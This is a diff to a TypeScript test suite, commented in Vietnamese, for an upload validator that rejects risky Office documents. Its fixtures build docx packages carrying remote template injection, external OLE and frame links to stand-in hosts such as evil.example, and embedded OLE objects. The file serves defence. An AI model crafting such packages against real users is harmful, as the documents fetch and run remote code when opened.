@@ -63,6 +63,10 @@ async function ooxml(
     vba?: boolean;
     skipMainPart?: boolean;
     contentTypesFirst?: boolean;
+    /** Thêm vào `[Content_Types].xml` (Default/Override). */
+    types?: string;
+    /** Phần thêm vào gói: tên → nội dung. */
+    parts?: Record<string, string | Buffer>;
   } = {},
 ): Promise<Buffer> {
   const [part, type] = MAIN[kind];
@@ -75,6 +79,7 @@ async function ooxml(
     (extra.vba
       ? '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
       : '') +
+    (extra.types ?? '') +
     // Thuộc tính đảo thứ tự: bộ đọc không được giả định PartName đứng trước.
     `<Override ContentType="${type}" PartName="${part}"/>` +
     '</Types>';
@@ -82,6 +87,7 @@ async function ooxml(
   zip.file('_rels/.rels', '<Relationships/>');
   if (!extra.skipMainPart) zip.file(part.slice(1), '<root/>');
   if (extra.vba) zip.file(`${part.split('/')[1]}/vbaProject.bin`, Buffer.from([0xcc, 0x61]));
+  for (const [name, body] of Object.entries(extra.parts ?? {})) zip.file(name, body);
   if (extra.contentTypesFirst === false) zip.file('[Content_Types].xml', types);
   return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
 }
@@ -164,6 +170,112 @@ describe('detectFileType — Office dạng mới (docx/xlsx/pptx) đọc `[Conte
 
   it('docx khai đúng loại nhưng có vbaProject.bin → từ chối', async () => {
     expect(detectFileType(await ooxml('docx', { vba: true }), 'x.docx')).toBeNull();
+  });
+
+  /*
+   * Gói sạch về macro vẫn chở được mã chạy: mẫu .dotm kéo từ máy lạ lúc mở (template injection),
+   * khung/OLE trỏ ra ngoài, hoặc đối tượng OLE nhúng (oleObject*.bin). Người tải về mở bằng
+   * Word là chạy — chặn ngay ở cửa tải lên.
+   */
+  const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
+  const rels = (type: string, target: string, mode = ' TargetMode="External"') =>
+    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
+    `<Relationship Id="rId1" Type="${REL}/${type}" Target="${target}"${mode}/>` +
+    '</Relationships>';
+
+  it.each([
+    [
+      'mẫu .dotm từ máy lạ (attachedTemplate External, http)',
+      { parts: { 'word/_rels/settings.xml.rels': rels('attachedTemplate', 'http://evil.example/t.dotm') } },
+    ],
+    [
+      'mẫu từ share UNC (attachedTemplate External)',
+      { parts: { 'word/_rels/settings.xml.rels': rels('attachedTemplate', '\\\\evil\\s\\t.dotm') } },
+    ],
+    [
+      'OLE trỏ ra ngoài (oleObject External)',
+      { parts: { 'word/_rels/document.xml.rels': rels('oleObject', 'https://evil.example/x.sct') } },
+    ],
+    [
+      'khung trỏ ra ngoài (frame External)',
+      { parts: { 'word/_rels/webSettings.xml.rels': rels('frame', 'http://evil.example/f.html') } },
+    ],
+    [
+      'đối tượng OLE nhúng (embeddings/oleObject1.bin)',
+      {
+        types:
+          '<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
+        parts: { 'word/embeddings/oleObject1.bin': Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) },
+      },
+    ],
+    [
+      'phần .bin trong embeddings dù không khai loại',
+      { parts: { 'word/embeddings/oleObject7.bin': Buffer.from([0x00]) } },
+    ],
+    [
+      'loại nội dung oleObject khai cho phần đổi đuôi',
+      {
+        types:
+          '<Override PartName="/word/media/a.dat" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
+        parts: { 'word/media/a.dat': Buffer.from([0x00]) },
+      },
+    ],
+    [
+      '.rels quá trần đọc (không xem được thì không cho qua)',
+      { parts: { 'word/_rels/document.xml.rels': ' '.repeat(1024 * 1024 + 1) } },
+    ],
+    [
+      'quan hệ oleObject nội bộ',
+      { parts: { 'word/_rels/document.xml.rels': rels('oleObject', 'embeddings/x.dat', '') } },
+    ],
+  ])('docx có %s → từ chối', async (_label, extra) => {
+    expect(detectFileType(await ooxml('docx', extra), 'x.docx')).toBeNull();
+  });
+
+  it.each([
+    [
+      'docx',
+      'liên kết web (hyperlink External)',
+      { parts: { 'word/_rels/document.xml.rels': rels('hyperlink', 'https://pmh.com.vn') } },
+    ],
+    [
+      'docx',
+      'mẫu trên chính máy người soạn (file:///C:/…)',
+      {
+        parts: {
+          'word/_rels/settings.xml.rels': rels(
+            'attachedTemplate',
+            'file:///C:/Users/it/AppData/Roaming/Microsoft/Templates/Normal.dotm',
+          ),
+        },
+      },
+    ],
+    [
+      'docx',
+      'khung trỏ phần NỘI BỘ của gói (không kéo gì từ ngoài)',
+      { parts: { 'word/_rels/webSettings.xml.rels': rels('frame', 'frame1.xml', '') } },
+    ],
+    [
+      'pptx',
+      'biểu đồ nhúng bảng Excel (embeddings/*.xlsx, quan hệ package)',
+      {
+        types:
+          '<Default Extension="xlsx" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>',
+        parts: {
+          'ppt/embeddings/Microsoft_Excel_Worksheet.xlsx': Buffer.from('PK'),
+          'ppt/charts/_rels/chart1.xml.rels': rels(
+            'package',
+            '../embeddings/Microsoft_Excel_Worksheet.xlsx',
+            '',
+          ),
+        },
+      },
+    ],
+  ] as const)('%s có %s → vẫn nhận', async (kind, _label, extra) => {
+    expect(detectFileType(await ooxml(kind, extra), `x.${kind}`)).toEqual({
+      mime: MIME[kind],
+      kind: 'document',
+    });
   });
 
   it('khai phần chính mà gói không có phần đó → từ chối', async () => {
